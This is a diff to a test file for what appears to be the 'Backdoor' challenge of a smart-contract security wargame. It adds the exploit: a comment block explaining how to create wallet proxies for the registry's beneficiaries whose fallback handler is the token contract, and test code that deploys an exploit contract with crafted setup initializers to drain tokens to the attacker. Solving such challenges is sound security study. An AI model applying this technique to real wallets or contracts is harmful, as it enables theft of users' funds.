@@ -35,8 +35,34 @@ describe('[Challenge] Backdoor', function () {
         await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // 1. Create a proxy contract for each beneficiary of the wallet registry by calling 
+    //    'createProxyWithCallback()' in the proxy factory contract
+    //    - Each proxy is created with one owner (beneficiary)
+    //    - Setup proxy contracts to call the token contract when the proxy fallback function is
+    //      excuted
+    // 2. Call new proxies with ERC20.transfer() call data
+    //    - Proxy contract will execute fallback function since 'transfer()' is not present
+    //    - Proxy contract calls token contract with 'transfer()' call data
+    //    - Token contract transfers tokens from proxy to attacker
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const WalletRegistryExploit = await ethers.getContractFactory('WalletRegistryExploit', deployer);
+        const exploit = await WalletRegistryExploit.deploy(this.walletFactory.address, this.walletRegistry.address, this.token.address);
+        const initializers = users.map((user) => {
+            return this.masterCopy.interface.encodeFunctionData("setup", [
+                [user],
+                1,
+                ethers.constants.AddressZero,
+                "0x",
+                this.token.address,
+                ethers.constants.AddressZero,
+                0,
+                ethers.constants.AddressZero
+            ]);
+        });
+        await exploit.connect(attacker).exploit(this.masterCopy.address, initializers);
     });
 
     after(async function () {
